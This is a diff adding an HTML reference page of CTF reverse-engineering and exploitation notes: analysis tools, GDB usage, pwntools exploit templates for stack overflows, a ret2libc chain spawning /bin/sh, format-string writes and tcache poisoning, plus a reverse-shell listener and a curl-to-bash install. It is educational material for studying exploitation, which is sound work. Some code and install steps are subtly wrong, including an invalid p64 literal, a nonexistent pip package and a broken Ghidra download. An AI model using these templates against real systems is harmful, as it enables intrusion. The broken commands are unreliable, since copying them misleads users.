@@ -1,0 +1,478 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Reverse Engineering Field Notes</title>
+<style>
+:root{
+  --bg:#0d1117; --bg2:#11161d; --panel:#161b22; --line:#22282f;
+  --text:#c9d1d9; --dim:#7d8590; --accent:#39d353; --accent2:#58a6ff; --warn:#f0883e;
+  box-sizing:border-box; padding-top:env(safe-area-inset-top,0px); padding-bottom:env(safe-area-inset-bottom,0px);
+}
+@media (prefers-color-scheme: light){
+  :root:not([data-theme="dark"]){
+    --bg:#f6f8fa; --bg2:#ffffff; --panel:#ffffff; --line:#d0d7de;
+    --text:#1f2328; --dim:#59636e; --accent:#116329; --accent2:#0969da; --warn:#9a6700;
+  }
+}
+*{box-sizing:border-box;}
+html{scroll-padding-top:calc(env(safe-area-inset-top,0px) + 56px);}
+html,body{height:100%;}
+body{
+  margin:0; background:var(--bg); color:var(--text);
+  font-family:"SF Mono",Consolas,"Liberation Mono",Menlo,monospace;
+  font-size:15px; line-height:1.6;
+}
+h1,h2,h3{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif; font-weight:700;}
+a{color:var(--accent2); text-decoration:none;}
+header{
+  position:sticky; top:0; z-index:20; padding-top:env(safe-area-inset-top,0px);
+  background:linear-gradient(180deg,var(--bg2) 80%,transparent); border-bottom:1px solid var(--line);
+}
+.topbar{max-width:1160px; margin:0 auto; padding:14px 20px; display:flex; align-items:center; gap:12px;}
+.dot{width:10px;height:10px;border-radius:50%;background:var(--accent);box-shadow:0 0 8px var(--accent);}
+.topbar h1{font-size:16px; margin:0; letter-spacing:.2px;}
+.topbar span{color:var(--dim); font-size:13px; font-family:inherit;}
+.wrap{max-width:1160px; margin:0 auto; display:grid; grid-template-columns:220px 1fr; gap:0;}
+nav{
+  position:sticky; top:56px; align-self:start; height:calc(100vh - 56px);
+  overflow-y:auto; padding:24px 12px 40px; border-right:1px solid var(--line);
+}
+nav a{display:block; padding:6px 10px; margin:1px 0; border-radius:6px; color:var(--dim); font-size:13px;}
+nav a:hover{background:var(--panel); color:var(--text);}
+nav .grp{color:var(--dim); font-size:10px; text-transform:uppercase; letter-spacing:1px; margin:16px 10px 4px; opacity:.6;}
+main{padding:32px 24px 80px; min-width:0; overflow-x:hidden;}
+section{margin-bottom:56px; scroll-margin-top:70px;}
+section h2{font-size:22px; margin:0 0 4px; display:flex; align-items:center; gap:10px;}
+section h2 .n{color:var(--dim); font-weight:400; font-size:15px;}
+.lede{color:var(--dim); max-width:70ch; margin:0 0 18px; font-family:-apple-system,sans-serif; font-size:14px;}
+h3{font-size:15px; color:var(--text); margin:22px 0 8px;}
+pre{
+  background:var(--panel); border:1px solid var(--line); border-radius:8px;
+  padding:14px 16px; overflow-x:auto; max-width:100%; font-size:13px; line-height:1.65;
+}
+code{font-family:inherit;}
+.c{color:var(--dim);}
+p code, li code{background:var(--panel); border:1px solid var(--line); border-radius:4px; padding:1px 6px; font-size:.9em;}
+table{border-collapse:collapse; width:100%; margin:10px 0 18px; font-size:13px;}
+th,td{border:1px solid var(--line); padding:7px 10px; text-align:left; vertical-align:top;}
+th{background:var(--panel); font-family:-apple-system,sans-serif; font-weight:600; font-size:12px;}
+tr:nth-child(even) td{background:var(--bg2);}
+.tag{display:inline-block; font-size:11px; padding:2px 8px; border-radius:20px; border:1px solid var(--line); color:var(--dim); font-family:-apple-system,sans-serif;}
+.tag.ok{color:var(--accent); border-color:var(--accent);}
+.tag.warn{color:var(--warn); border-color:var(--warn);}
+ul{padding-left:20px;} li{margin:4px 0;}
+.note{border-left:3px solid var(--accent2); background:var(--panel); padding:10px 14px; border-radius:0 6px 6px 0; font-size:13.5px; margin:14px 0;}
+footer{border-top:1px solid var(--line); padding:24px; text-align:center; color:var(--dim); font-family:-apple-system,sans-serif; font-size:12px;}
+@media (max-width:820px){
+  .wrap{display:block;}
+  nav{position:static; height:auto; border-right:none; border-bottom:1px solid var(--line); display:flex; flex-wrap:wrap; gap:2px; padding:14px;}
+  nav .grp{display:none;}
+  nav a{padding:5px 9px;}
+}
+</style>
+</head>
+<body>
+<header><div class="topbar"><div class="dot"></div><h1>Reverse Engineering Field Notes</h1><span>Linux CTF / pwn reference</span></div></header>
+<div class="wrap">
+<nav>
+  <div class="grp">Start here</div>
+  <a href="#basics">RE Basics</a>
+  <a href="#mitigations">Mitigations</a>
+  <div class="grp">Core skills</div>
+  <a href="#asm">x86/x64 Assembly</a>
+  <a href="#static">Static Analysis</a>
+  <a href="#dynamic">Dynamic Analysis</a>
+  <a href="#overflow">Buffer Overflow</a>
+  <a href="#rop">ROP Chains</a>
+  <a href="#fmtstr">Format Strings</a>
+  <a href="#heap">Heap Exploitation</a>
+  <a href="#instrument">Frida &amp; angr</a>
+  <a href="#network">Network / Traffic</a>
+  <div class="grp">Setup</div>
+  <a href="#install">Tool Install</a>
+</nav>
+<main>
+
+<section id="basics">
+<h2>RE Basics <span class="n">first contact with a binary</span></h2>
+<p class="lede">Reverse engineering is analyzing a compiled binary to understand its behavior without source. In CTFs the goal is usually a hidden flag; in the wild it's understanding what a piece of software actually does.</p>
+
+<h3>First steps with any binary</h3>
+<pre><span class="c"># 1. Identify the file type</span>
+file challenge
+
+<span class="c"># 2. Check security mitigations</span>
+checksec --file=challenge
+
+<span class="c"># 3. Extract readable strings</span>
+strings challenge
+strings challenge | grep -i "flag\|ctf\|key\|pass"
+
+<span class="c"># 4. Shared library dependencies</span>
+ldd challenge
+
+<span class="c"># 5. ELF headers / symbols</span>
+readelf -h challenge
+readelf -s challenge
+readelf -d challenge          <span class="c"># dynamic section</span>
+objdump -T challenge          <span class="c"># dynamic symbol table</span>
+
+<span class="c"># 6. Raw bytes</span>
+xxd challenge | head -30
+od -A x -t x1z challenge | head</pre>
+
+<h3>Permissions & execution</h3>
+<pre>chmod +x challenge
+./challenge
+file challenge          <span class="c"># confirm ELF 32/64-bit, stripped?, PIE?</span>
+nm challenge             <span class="c"># symbols, if not stripped</span></pre>
+</section>
+
+<section id="mitigations">
+<h2>Binary Security Mitigations <span class="n">what checksec shows you</span></h2>
+<table>
+<tr><th>Mitigation</th><th>What it does</th><th>Typical bypass</th></tr>
+<tr><td>NX / DEP</td><td>Stack is non-executable</td><td>ROP chains, ret2libc</td></tr>
+<tr><td>Stack Canary</td><td>Random value before saved return address; crashes on overwrite</td><td>Leak the canary via format string or partial overwrite, then rewrite it unchanged</td></tr>
+<tr><td>ASLR</td><td>Randomizes stack/heap/library base addresses each run</td><td>Info leak, brute force on 32-bit, or partial overwrite of low bytes</td></tr>
+<tr><td>PIE</td><td>Randomizes the binary's own base address</td><td>Leak a code pointer to compute the base</td></tr>
+<tr><td>RELRO</td><td>Makes the GOT read-only after linking</td><td>Partial RELRO still allows GOT overwrite; Full RELRO blocks it</td></tr>
+</table>
+<div class="note">Run <code>checksec --file=./binary</code> first, every time. It tells you which exploitation techniques are even on the table before you write a line of exploit code.</div>
+</section>
+
+<section id="asm">
+<h2>x86 / x64 Assembly <span class="n">read it, don't write it</span></h2>
+<p class="lede">You rarely need to write assembly for RE — you need to recognize patterns: function calls, loops, conditionals, string comparisons.</p>
+
+<h3>Key registers (x64)</h3>
+<table>
+<tr><th>Register</th><th>Purpose</th><th>x86 equiv</th></tr>
+<tr><td>RAX</td><td>Return value from functions</td><td>EAX</td></tr>
+<tr><td>RBP</td><td>Base pointer (stack frame)</td><td>EBP</td></tr>
+<tr><td>RSP</td><td>Stack pointer (top of stack)</td><td>ESP</td></tr>
+<tr><td>RIP</td><td>Instruction pointer (next instruction)</td><td>EIP</td></tr>
+<tr><td>RDI</td><td>1st function argument</td><td>(stack)</td></tr>
+<tr><td>RSI</td><td>2nd function argument</td><td>(stack)</td></tr>
+<tr><td>RDX</td><td>3rd function argument</td><td>(stack)</td></tr>
+<tr><td>RCX</td><td>4th argument / loop counter</td><td>(stack)</td></tr>
+</table>
+
+<h3>Common instructions</h3>
+<pre><span class="c">; data movement</span>
+mov  rax, 5           <span class="c">; rax = 5</span>
+push rax              <span class="c">; push onto stack</span>
+pop  rbx              <span class="c">; pop stack top into rbx</span>
+lea  rax, [rbp-0x8]   <span class="c">; load effective address (pointer)</span>
+
+<span class="c">; arithmetic</span>
+add  rax, rbx
+sub  rax, 1
+xor  eax, eax         <span class="c">; zero a register (common idiom)</span>
+imul rax, rbx
+
+<span class="c">; comparison & jumps</span>
+cmp  rax, 0
+je   label            <span class="c">; jump if equal (ZF=1)</span>
+jne  label            <span class="c">; jump if not equal</span>
+jg   label            <span class="c">; jump if greater</span>
+jl   label            <span class="c">; jump if less</span>
+
+<span class="c">; functions</span>
+call function          <span class="c">; push return addr, jump</span>
+ret                    <span class="c">; pop return address into RIP</span></pre>
+
+<h3>Recognizing patterns</h3>
+<pre><span class="c">; if (strcmp(input, "secret") == 0)</span>
+lea  rdi, [rip+0x100]  <span class="c">; rdi = input</span>
+lea  rsi, [rip+0x200]  <span class="c">; rsi = "secret"</span>
+call strcmp
+test eax, eax
+je   success
+
+<span class="c">; for (i = 0; i < 10; i++)</span>
+mov  ecx, 0
+loop_start:
+  cmp  ecx, 10
+  jge  loop_end
+  <span class="c">; ... body ...</span>
+  add  ecx, 1
+  jmp  loop_start
+loop_end:</pre>
+</section>
+
+<section id="static">
+<h2>Static Analysis <span class="n">reading without running</span></h2>
+<h3>Disassembly & decompilation</h3>
+<pre>objdump -d challenge                    <span class="c"># AT&T disassembly</span>
+objdump -d -M intel challenge           <span class="c"># Intel syntax (easier to read)</span>
+objdump -d -M intel --no-show-raw-insn challenge
+
+<span class="c"># Ghidra (GUI decompiler) — analyzeHeadless for scripting</span>
+ghidra
+analyzeHeadless /project proj -import challenge -postScript decompile.py
+
+<span class="c"># radare2 / rizin</span>
+r2 -A challenge
+[0x...]> aaa          <span class="c"># analyze all</span>
+[0x...]> afl          <span class="c"># list functions</span>
+[0x...]> pdf @main    <span class="c"># disassemble function</span>
+[0x...]> iz            <span class="c"># strings in data sections</span>
+
+<span class="c"># IDA free / Binary Ninja (GUI, not shown — same workflow)</span></pre>
+<h3>Cross-references & structure</h3>
+<pre>objdump -R challenge         <span class="c"># relocations</span>
+readelf -S challenge         <span class="c"># section headers</span>
+readelf -x .rodata challenge <span class="c"># hex dump a section</span>
+nm -D challenge               <span class="c"># dynamic symbols</span>
+c++filt _Z...                 <span class="c"># demangle C++ symbol names</span>
+
+<span class="c"># diffing two binary versions</span>
+objdump -d v1 > v1.asm; objdump -d v2 > v2.asm; diff v1.asm v2.asm
+bindiff v1.BinExport v2.BinExport   <span class="c"># BinDiff, needs exported IDBs</span></pre>
+<h3>More strings &amp; entropy tricks</h3>
+<pre>strings -n 8 challenge                 <span class="c"># only strings >= 8 chars</span>
+strings -t x challenge                 <span class="c"># prefix each with its file offset</span>
+binwalk challenge                       <span class="c"># find embedded files / packers</span>
+binwalk -e challenge                    <span class="c"># extract embedded content</span>
+upx -d challenge                        <span class="c"># unpack a UPX-packed binary</span>
+ent challenge                           <span class="c"># entropy check (high = packed/encrypted)</span></pre>
+</section>
+
+<section id="dynamic">
+<h2>Dynamic Analysis <span class="n">watching it run</span></h2>
+<h3>GDB (the workhorse)</h3>
+<pre>gdb ./challenge
+(gdb) break main
+(gdb) run < input.txt
+(gdb) info registers
+(gdb) x/20xg $rsp            <span class="c"># examine 20 giant words at stack pointer</span>
+(gdb) disassemble main
+(gdb) stepi / nexti           <span class="c"># step one instruction / step over calls</span>
+(gdb) continue
+(gdb) print $rax
+(gdb) watch *0x601040          <span class="c"># hardware watchpoint on an address</span>
+(gdb) break *0x401234           <span class="c"># break at raw address</span>
+(gdb) info proc mappings         <span class="c"># memory map of running process</span>
+(gdb) x/s $rdi                    <span class="c"># examine as string</span>
+(gdb) x/10i $rip                  <span class="c"># disassemble 10 instrs at RIP</span>
+(gdb) set follow-fork-mode child  <span class="c"># debug child after fork()</span>
+(gdb) generate-core-file          <span class="c"># dump a core for offline analysis</span></pre>
+<h3>GEF / pwndbg (GDB plugins — strongly recommended)</h3>
+<pre>pip install gef                 <span class="c"># or pwndbg — adds context, heap view, etc.</span>
+gdb -q ./challenge
+gef> vmmap                      <span class="c"># memory layout</span>
+gef> checksec
+gef> heap chunks</pre>
+<h3>Tracing syscalls & library calls</h3>
+<pre>strace ./challenge               <span class="c"># syscalls</span>
+strace -f -e trace=network ./challenge
+ltrace ./challenge                <span class="c"># library calls</span></pre>
+<h3>Sandboxed / patched execution</h3>
+<pre>ltrace -S ./challenge
+patchelf --set-interpreter ./ld-2.31.so challenge   <span class="c"># run with a specific libc</span>
+LD_PRELOAD=./libc.so.6 ./challenge</pre>
+</section>
+
+<section id="overflow">
+<h2>Buffer Overflow <span class="n">smashing the stack</span></h2>
+<h3>Finding the offset</h3>
+<pre><span class="c"># pwntools cyclic pattern</span>
+python3 -c "from pwn import *; print(cyclic(200))" > pattern.txt
+gdb ./challenge
+(gdb) run < pattern.txt
+(gdb) x/wx $rsp
+<span class="c"># crash value -> find offset</span>
+python3 -c "from pwn import *; print(cyclic_find(0x61616171))"</pre>
+<h3>Basic exploit skeleton (pwntools)</h3>
+<pre>from pwn import *
+
+p = process('./challenge')          <span class="c"># or remote('host', port)</span>
+offset = 72
+ret_addr = p64(0x deadbeef)          <span class="c"># target address, e.g. win() or system()</span>
+
+payload  = b'A' * offset
+payload += ret_addr
+
+p.sendline(payload)
+p.interactive()</pre>
+<h3>Leaking a stack canary</h3>
+<pre><span class="c"># canary is the first 8 bytes after your buffer, always ends in 0x00</span>
+payload = b'A' * offset            <span class="c"># fill exactly up to canary</span>
+p.sendafter(b'> ', payload)
+leak = u64(p.recv(8).ljust(8, b'\x00')) 
+canary = leak &amp; ~0xff              <span class="c"># low byte is the null terminator</span></pre>
+</section>
+
+<section id="rop">
+<h2>ROP Chains <span class="n">code reuse when NX is on</span></h2>
+<h3>Finding gadgets</h3>
+<pre>ROPgadget --binary challenge
+ROPgadget --binary challenge --only "pop|ret"
+ropper --file challenge --search "pop rdi"
+
+<span class="c"># one-gadgets in libc (spawns a shell directly)</span>
+one_gadget libc.so.6</pre>
+<h3>ret2libc chain (pwntools)</h3>
+<pre>from pwn import *
+
+elf  = ELF('./challenge')
+libc = ELF('./libc.so.6')
+p = process('./challenge')
+
+pop_rdi = 0x0000000000401234        <span class="c"># from ROPgadget</span>
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main = elf.symbols['main']
+
+<span class="c"># stage 1: leak libc's puts address</span>
+payload  = b'A' * offset
+payload += p64(pop_rdi) + p64(puts_got)
+payload += p64(puts_plt) + p64(main)
+p.sendline(payload)
+
+leaked = u64(p.recvline().strip().ljust(8, b'\x00'))
+libc_base = leaked - libc.symbols['puts']
+system = libc_base + libc.symbols['system']
+bin_sh = libc_base + next(libc.search(b'/bin/sh'))
+
+<span class="c"># stage 2: call system('/bin/sh')</span>
+payload  = b'A' * offset
+payload += p64(pop_rdi) + p64(bin_sh)
+payload += p64(system)
+p.sendline(payload)
+p.interactive()</pre>
+<div class="note">Same shape covers ret2plt, ret2csu (when you're short on gadgets), and SROP (<code>pwn.SigreturnFrame</code>) — only the gadgets and target function change.</div>
+</section>
+
+<section id="fmtstr">
+<h2>Format String Exploitation <span class="n">printf("%s", user_input)</span></h2>
+<h3>Detecting &amp; probing</h3>
+<pre><span class="c"># feed %x/%p/%n sequences and watch for leaked stack data or a crash</span>
+./challenge
+> AAAA %x %x %x %x %x %x %x %x
+> %7$p                          <span class="c"># read the 7th stack argument directly</span>
+
+<span class="c"># pwntools helper finds the right offset automatically</span>
+python3 -c "from pwn import *; print(fmtstr_payload(7, {0x601040: 0xdeadbeef}))"</pre>
+<h3>Arbitrary read / write</h3>
+<pre><span class="c"># %n writes the number of bytes printed so far to a pointer on the stack</span>
+payload = fmtstr_payload(offset, {target_addr: value})
+p.sendline(payload)</pre>
+</section>
+
+<section id="heap">
+<h2>Heap Exploitation <span class="n">glibc malloc internals</span></h2>
+<h3>Inspecting the heap</h3>
+<pre>gdb ./challenge
+gef> heap chunks                 <span class="c"># list all chunks</span>
+gef> heap bins                    <span class="c"># tcache / fastbin / unsorted bin state</span>
+gef> heap chunk 0x603010          <span class="c"># inspect one chunk's metadata</span>
+pwndbg> vis                        <span class="c"># pwndbg's visual heap map</span></pre>
+<h3>Classic bug classes</h3>
+<ul>
+<li><code>use-after-free</code> — free a chunk, keep a dangling pointer, reuse it</li>
+<li><code>double free</code> — free the same chunk twice to corrupt the tcache/fastbin freelist</li>
+<li><code>heap overflow</code> — overflow one chunk's data into the next chunk's metadata</li>
+<li><code>tcache poisoning</code> — overwrite a freed chunk's <code>fd</code> pointer to make the next <code>malloc()</code> return an attacker-chosen address</li>
+</ul>
+<pre><span class="c"># tcache poisoning skeleton (glibc 2.27+)</span>
+malloc(0x30) -> chunk A
+free(A)                          <span class="c"># A now heads the tcache freelist</span>
+edit(A, p64(target_addr))        <span class="c"># overwrite A's fd pointer</span>
+malloc(0x30)                      <span class="c"># returns A again</span>
+malloc(0x30)                      <span class="c"># returns target_addr — write anywhere</span></pre>
+</section>
+
+<section id="instrument">
+<h2>Frida &amp; angr <span class="n">instrumentation and symbolic execution</span></h2>
+<h3>Frida — hook functions at runtime</h3>
+<pre>frida-ps -U                                 <span class="c"># list processes (device)</span>
+frida -f ./challenge -l hook.js --no-pause  <span class="c"># spawn + attach with a script</span></pre>
+<pre><span class="c">// hook.js — intercept a function call</span>
+Interceptor.attach(Module.getExportByName(null, "strcmp"), {
+  onEnter(args) {
+    console.log("strcmp:", args[0].readCString(), args[1].readCString());
+  }
+});</pre>
+<h3>angr — symbolic execution to solve constraints</h3>
+<pre>python3 - <<'EOF'
+import angr, claripy
+proj = angr.Project('./challenge', auto_load_libs=False)
+state = proj.factory.entry_state()
+simgr = proj.factory.simgr(state)
+simgr.explore(find=lambda s: b"Correct" in s.posix.dumps(1))
+print(simgr.found[0].posix.dumps(0))   <span class="c"># the input that reaches "Correct"</span>
+EOF</pre>
+</section>
+
+<section id="network">
+<h2>Network / Traffic Analysis <span class="n">when the binary talks over the wire</span></h2>
+<pre>tcpdump -i any -w capture.pcap 'port 1337'
+wireshark capture.pcap                       <span class="c"># GUI inspection, follow TCP stream</span>
+tshark -r capture.pcap -Y "tcp.port==1337" -T fields -e data
+nc -lvnp 1337                                 <span class="c"># catch a reverse shell / raw listener</span>
+socat TCP-LISTEN:1337,fork,reuseaddr STDOUT   <span class="c"># quick relay/listener</span></pre>
+</section>
+
+<section id="install">
+<h2>Tool Installation <span class="n">Debian / Ubuntu / Kali</span></h2>
+<h3>Base toolchain</h3>
+<pre>sudo apt update
+sudo apt install -y build-essential gdb file binutils elfutils \
+  strace ltrace xxd bsdmainutils patchelf</pre>
+<h3>checksec</h3>
+<pre>sudo apt install -y checksec
+<span class="c"># or the actively maintained python version:</span>
+pip3 install checksec.py --user</pre>
+<h3>GDB enhancements</h3>
+<pre><span class="c"># GEF</span>
+bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
+
+<span class="c"># pwndbg (alternative)</span>
+git clone https://github.com/pwndbg/pwndbg
+cd pwndbg &amp;&amp; ./setup.sh</pre>
+<h3>Exploitation framework</h3>
+<pre>pip3 install --upgrade pip
+pip3 install pwntools ropper
+sudo apt install -y python3-dev libssl-dev
+
+<span class="c"># ROPgadget</span>
+pip3 install ROPgadget
+<span class="c"># or: git clone https://github.com/JonathanSalwan/ROPgadget && cd ROPgadget && sudo python3 setup.py install</span>
+
+<span class="c"># one_gadget (needs ruby)</span>
+sudo apt install -y ruby ruby-dev
+sudo gem install one_gadget</pre>
+<h3>Disassemblers / decompilers</h3>
+<pre><span class="c"># radare2 (from source, always latest)</span>
+git clone https://github.com/radareorg/radare2
+cd radare2 &amp;&amp; sys/install.sh
+
+<span class="c"># rizin (r2 fork, faster releases)</span>
+sudo apt install -y rizin
+
+<span class="c"># Ghidra (needs JDK 17+)</span>
+sudo apt install -y openjdk-17-jdk
+wget https://github.com/NationalSecurityAgency/ghidra/releases/latest
+unzip ghidra_*.zip &amp;&amp; cd ghidra_*/  &amp;&amp; ./ghidraRun
+
+<span class="c"># Binary Ninja / IDA Free — download .run / .AppImage from vendor site</span></pre>
+<h3>Docker route (isolated, reproducible)</h3>
+<pre>docker pull remnux/remnux-distro     <span class="c"># RE-focused distro, many tools preinstalled</span>
+docker run -it --rm -v $(pwd):/data remnux/remnux-distro</pre>
+<h3>Instrumentation, symbolic execution &amp; extras</h3>
+<pre>pip3 install frida-tools angr             <span class="c"># frida-tools also pulls the frida CLI</span>
+sudo apt install -y binwalk upx-ucl ent
+sudo apt install -y wireshark tcpdump tshark socat netcat-openbsd
+sudo apt install -y bindiff                <span class="c"># or download the .deb from Zynamics/Google</span></pre>
+<div class="tag ok">apt/pip</div> <div class="tag ok">git source</div> <div class="tag warn">check hashes on release downloads</div>
+</section>
+
+</main>
+</div>
+<footer>Reference notes for CTF-style reverse engineering on Linux — always test only on binaries you own or are authorized to analyze.</footer>
+</body>
+</html>
